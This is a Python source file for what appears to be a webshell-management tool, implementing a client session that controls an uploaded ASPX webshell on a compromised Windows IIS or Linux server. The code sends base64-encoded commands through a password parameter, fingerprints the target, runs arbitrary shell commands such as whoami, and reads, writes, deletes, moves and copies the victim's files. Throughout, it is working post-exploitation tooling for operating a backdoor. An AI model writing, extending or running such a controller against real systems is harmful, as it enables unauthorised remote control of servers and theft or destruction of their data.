"""ShadowHalberd默认 ASPX WebShell"""

import base64
import json
import logging
import typing as t

import httpx

from ..core import exceptions
from ..core.base import (
    register_session,
    SessionInterface,
    Option,
    OptionGroup,
    HttpResponseDict,
    DirectoryEntry,
    BasicInfoEntry,
    ProcessProtocol,
    get_http_client,
    proxy_option,
)

logger = logging.getLogger("core.sessions.ghost_aspx")


@register_session
class GhostASPXWebshell(SessionInterface):
    """ShadowHalberd默认 ASPX WebShell

    受控端通过密码参数接收 base64 编码的 action 数据包，支持命令执行与文件管理。
    数据包格式：action|arg1|arg2|...
    """

    session_type = "GHOST_ASPX"
    readable_name = "XuLink ASPX"
    conn_options: t.List[OptionGroup] = [
        {
            "name": "Basic Connection Config",
            "options": [
                Option(
                    id="url",
                    name="URL",
                    type="text",
                    placeholder="http://xxx.com/shell.aspx",
                    default_value=None,
                    alternatives=None,
                ),
                Option(
                    id="password",
                    name="Password",
                    type="text",
                    placeholder="******",
                    default_value=None,
                    alternatives=None,
                ),
                Option(
                    id="https_verify",
                    name="Verify HTTPS Certificate",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
                Option(
                    id="timeout",
                    name="HTTP Timeout",
                    type="text",
                    placeholder="Timeout in seconds, 0 = wait indefinitely",
                    default_value="10.0",
                    alternatives=None,
                ),
                proxy_option(),
            ],
        }
    ]

    _WINDOWS_CMD_MAP = {
        "pwd": "cd",
        "ls": "dir",
        "cat": "type",
        "clear": "cls",
    }

    def __init__(self, session_conn: dict):
        self.url = session_conn["url"]
        self.password = session_conn["password"]
        self.https_verify = session_conn.get("https_verify", True)
        self.proxy = session_conn.get("proxy") or None
        try:
            self.timeout = float(session_conn.get("timeout", "10.0"))
        except ValueError:
            self.timeout = 10.0
        if not self.timeout:
            self.timeout = None
        self.client = get_http_client(session_conn, verify=self.https_verify)
        self._os: t.Optional[str] = None
        self._legacy_mode: t.Optional[bool] = None

    async def _send_raw(self, cmd: str) -> str:
        """旧版 shell 只接收 base64 编码的原始命令"""
        encoded = base64.b64encode(cmd.encode("utf-8")).decode("ascii")
        params = {self.password: encoded}
        try:
            response = await self.client.post(
                self.url, data=params, timeout=self.timeout
            )
            # 如果目标禁用了 POST，回退到 GET（部分 IIS 上传目录只允许 GET）
            if response.status_code == 405:
                response = await self.client.get(
                    self.url, params=params, timeout=self.timeout
                )
        except httpx.TimeoutException as exc:
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求到受控端失败：" + str(exc)) from exc
        return response.text

    async def _send_action(self, action: str, *args: str) -> str:
        """新版 shell 接收 action|arg1|arg2|... 数据包"""
        payload = "|".join([action] + list(args))
        encoded = base64.b64encode(payload.encode("utf-8")).decode("ascii")
        params = {self.password: encoded}
        try:
            response = await self.client.post(
                self.url, data=params, timeout=self.timeout
            )
            if response.status_code == 405:
                response = await self.client.get(
                    self.url, params=params, timeout=self.timeout
                )
        except httpx.TimeoutException as exc:
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求到受控端失败：" + str(exc)) from exc
        text = response.text
        if text.startswith("err:"):
            raise exceptions.UserError("受控端报错：" + text[4:])
        return text

    async def _detect_mode(self) -> bool:
        if self._legacy_mode is not None:
            return self._legacy_mode
        marker = "ghost_aspx_legacy_detect_"
        try:
            result = await self._send_raw(f"echo {marker}")
            self._legacy_mode = marker in result
        except Exception as exc:
            logger.debug("ASPX 模式探测失败: %s", exc)
            self._legacy_mode = False
        return self._legacy_mode

    async def _send_command(self, cmd: str) -> str:
        if await self._detect_mode():
            return await self._send_raw(cmd)
        return await self._send_action("cmd", cmd)

    async def _detect_os(self) -> str:
        if self._os is not None:
            return self._os
        # ShadowHalberd默认 ASPX 默认在 Windows IIS 上运行，先尝试 Windows
        text = (await self._send_command("ver")).lower()
        if "windows" in text or "microsoft" in text:
            self._os = "windows"
            return self._os
        text = (await self._send_command("uname")).strip()
        if text and "not" not in text.lower() and "不是" not in text:
            self._os = "linux"
            return self._os
        self._os = "windows"
        return self._os

    def _translate_cmd(self, cmd: str) -> str:
        cmd = cmd.strip()
        if self._os == "windows":
            # 把常见的 Linux 命令映射为 Windows cmd 命令
            first = cmd.split()[0] if cmd else ""
            if first in self._WINDOWS_CMD_MAP:
                return self._WINDOWS_CMD_MAP[first] + cmd[len(first):]
        return cmd

    async def execute_cmd(self, cmd: str) -> str:
        await self._detect_os()
        translated = self._translate_cmd(cmd)
        return await self._send_command(translated)

    async def test_usablility(self) -> bool:
        try:
            marker = "ghost_aspx_ok_"
            result = await self.execute_cmd(f"echo {marker}")
            return marker in result
        except Exception as exc:
            logger.debug("ASPX可用性测试失败: %s", exc)
            return False

    async def get_pwd(self) -> str:
        os_type = await self._detect_os()
        cmd = "cd" if os_type == "windows" else "pwd"
        return await self._send_command(cmd)

    async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
        os_type = await self._detect_os()
        result: t.List[BasicInfoEntry] = []
        if os_type == "windows":
            result.append(
                BasicInfoEntry(key="操作系统", value=await self._send_command("ver"))
            )
            result.append(
                BasicInfoEntry(key="当前用户", value=await self._send_command("whoami"))
            )
            result.append(
                BasicInfoEntry(key="当前目录", value=await self._send_command("cd"))
            )
        else:
            result.append(
                BasicInfoEntry(key="操作系统", value=await self._send_command("uname -a"))
            )
            result.append(
                BasicInfoEntry(key="当前用户", value=await self._send_command("whoami"))
            )
            result.append(
                BasicInfoEntry(key="当前目录", value=await self._send_command("pwd"))
            )
        return result

    async def _ensure_file_manager(self) -> None:
        if await self._detect_mode():
            raise exceptions.UserError("当前ASPX是旧版shell，请重新生成并上传以支持文件管理")

    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
        await self._ensure_file_manager()
        text = await self._send_action("list", dir_path)
        entries: t.List[DirectoryEntry] = []
        try:
            for item in json.loads(text):
                entries.append(
                    DirectoryEntry(
                        name=item["name"],
                        entry_type="dir" if item["type"] == "dir" else "file",
                        filesize=int(item.get("size", 0)),
                        permission="",
                    )
                )
        except Exception as exc:
            logger.debug("ASPX list_dir parse failed: %s", exc)
            raise exceptions.UserError("无法解析目录列表") from exc
        return entries

    async def get_file_contents(self, filepath: str, max_size: int = 1024 * 200) -> bytes:
        await self._ensure_file_manager()
        text = await self._send_action("read", filepath)
        data = base64.b64decode(text)
        if len(data) > max_size:
            raise exceptions.UserError("文件超过最大读取大小")
        return data

    async def put_file_contents(self, filepath: str, content: bytes) -> bool:
        await self._ensure_file_manager()
        encoded = base64.b64encode(content).decode("ascii")
        result = await self._send_action("write", filepath, encoded)
        return result.strip() == "ok"

    async def mkdir(self, dir_path: str) -> None:
        await self._ensure_file_manager()
        result = await self._send_action("mkdir", dir_path)
        if result.strip() != "ok":
            raise exceptions.UserError("创建目录失败：" + result)

    async def delete_file(self, filepath: str) -> bool:
        await self._ensure_file_manager()
        result = await self._send_action("delete", filepath)
        return result.strip() == "ok"

    async def move_file(self, filepath: str, new_filepath: str) -> None:
        await self._ensure_file_manager()
        result = await self._send_action("move", filepath, new_filepath)
        if result.strip() != "ok":
            raise exceptions.UserError("移动失败：" + result)

    async def copy_file(self, filepath: str, new_filepath: str) -> None:
        await self._ensure_file_manager()
        result = await self._send_action("copy", filepath, new_filepath)
        if result.strip() != "ok":
            raise exceptions.UserError("复制失败：" + result)

    async def upload_file(
        self, filepath: str, content: bytes, callback: t.Union[t.Callable, None] = None
    ) -> bool:
        return await self.put_file_contents(filepath, content)

    async def download_file(
        self, filepath: str, callback: t.Union[t.Callable, None] = None
    ) -> bytes:
        return await self.get_file_contents(filepath)

    async def modify_file(
        self,
        filepath: str,
        old_str: str,
        new_str: str,
        replace_strategy: t.Union[str, None] = None,
    ) -> None:
        raise exceptions.UserError("ShadowHalberd默认ASPX暂不支持文件内容替换")

    async def send_bytes_over_tcp(
        self,
        host: str,
        port: int,
        content: bytes,
        send_method: t.Union[str, None] = None,
    ) -> t.Union[bytes, None]:
        raise exceptions.UserError("ShadowHalberd默认ASPX暂不支持TCP转发")

    async def get_send_tcp_support_methods(self) -> t.List[str]:
        return []

    async def send_http_request(
        self,
        url: str,
        method: str = "GET",
        headers: t.Optional[t.Dict[str, str]] = None,
        params: t.Optional[t.Dict[str, t.Any]] = None,
        data: t.Optional[t.Union[str, bytes]] = None,
    ) -> HttpResponseDict:
        raise exceptions.UserError("ShadowHalberd默认ASPX暂不支持HTTP请求转发")

    async def create_process(
        self,
        argv: t.List[str],
        overrides_env: t.Union[t.Dict[str, str], None] = None,
    ) -> ProcessProtocol:
        raise exceptions.UserError("ShadowHalberd默认ASPX暂不支持创建进程")
